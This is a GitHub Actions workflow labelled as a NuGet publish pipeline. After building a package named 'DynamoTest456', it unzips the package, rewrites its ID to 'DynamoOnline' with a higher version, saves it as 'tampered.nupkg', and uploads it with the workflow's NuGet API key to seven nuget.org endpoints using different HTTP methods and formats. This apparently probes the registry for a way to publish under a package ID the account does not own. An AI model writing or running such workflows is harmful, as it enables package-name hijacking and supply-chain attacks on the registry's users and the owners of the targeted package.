name: Publish to NuGet

on:
  push:
    tags: ['v*']

permissions:
  id-token: write
  contents: read

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'
      
      - name: Build
        run: dotnet build -c Release
      
      - name: Pack
        run: dotnet pack -c Release -o ./artifacts --no-build

      - name: NuGet Login
        uses: NuGet/login@v1
        id: login
        with:
          user: ${{ secrets.NUGET_USER }}
      
      - name: Try different API endpoints
        run: |
          cd artifacts
          ORIG_PKG=$(ls *.nupkg)
          
          # Create package with DynamoOnline ID
          rm -rf tampered tampered.nupkg
          mkdir tampered
          unzip -o "$ORIG_PKG" -d tampered
          find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>DynamoOnline</id>|g" {} \;
          find tampered -name "*.nuspec" -exec sed -i "s|<version>1.0.0</version>|<version>2.0.0</version>|g" {} \;
          cd tampered && zip -r ../tampered.nupkg . && cd ..
          
          echo "=== Try v2 package endpoint ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "X-NuGet-Client-Version: 6.0.0" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @tampered.nupkg
          
          echo -e "\n\n=== Try v3 package endpoint ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://api.nuget.org/v3/package/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "X-NuGet-Client-Version: 6.0.0" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @tampered.nupkg
          
          echo -e "\n\n=== Try v3 flat container ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://api.nuget.org/v3-flatcontainer/dynamoonline/2.0.0/dynamoonline.2.0.0.nupkg" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @tampered.nupkg
          
          echo -e "\n\n=== Try symbolpackage endpoint ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/symbolpackage/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "X-NuGet-Client-Version: 6.0.0" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @tampered.nupkg
          
          echo -e "\n\n=== Try with different HTTP methods ==="
          curl -s -w "\nHTTP:%{http_code}" -X POST "https://www.nuget.org/api/v2/package/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "X-NuGet-Client-Version: 6.0.0" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @tampered.nupkg
          
          echo -e "\n\n=== Try multipart form ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "X-NuGet-Client-Version: 6.0.0" \
            -F "package=@tampered.nupkg"
          
          echo -e "\n\n=== Try package ID in URL ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/DynamoOnline/2.0.0" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "X-NuGet-Client-Version: 6.0.0" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @tampered.nupkg
            
        env:
          NUGET_KEY: ${{ steps.login.outputs.NUGET_API_KEY }}
